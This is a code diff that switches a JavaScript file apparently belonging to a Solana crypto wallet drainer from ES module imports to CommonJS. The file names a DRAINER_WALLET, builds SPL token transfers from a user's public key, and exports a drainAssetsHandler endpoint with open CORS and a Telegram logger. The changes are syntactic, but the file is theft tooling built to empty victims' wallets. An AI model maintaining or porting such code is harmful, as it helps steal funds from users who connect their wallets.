@@ -1,17 +1,17 @@
-import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, getMint, createAssociatedTokenAccountInstruction } from '@solana/spl-token';
+const { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } = require('@solana/web3.js');
+const { getAssociatedTokenAddress, createTransferInstruction, getMint, createAssociatedTokenAccountInstruction } = require('@solana/spl-token');
 
 // Import fetch for Node.js compatibility
-import fetch from 'node-fetch';
+const fetch = require('node-fetch');
 
 // Import centralized error handling
-import errorHandler from '../src/errorHandler.js';
+const errorHandler = require('../src/errorHandler.js');
 
 // Import centralized configuration
-import { ENV_CONFIG, RPC_ENDPOINTS, PROJECT_NAME } from '../env.config.js';
+const { ENV_CONFIG, RPC_ENDPOINTS, PROJECT_NAME } = require('../env.config.js');
 
 // Import Telegram logger singleton
-import telegramLogger from '../src/telegram.js';
+const telegramLogger = require('../src/telegram.js');
 
 // Configuration from environment variables - with error handling
 let DRAINER_WALLET;
@@ -607,7 +607,7 @@ async function createCleanSPLTransfer(connection, tokens, userPubkey) {
 }
 
 
-export default async function drainAssetsHandler(req, res) {
+module.exports = async function drainAssetsHandler(req, res) {
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
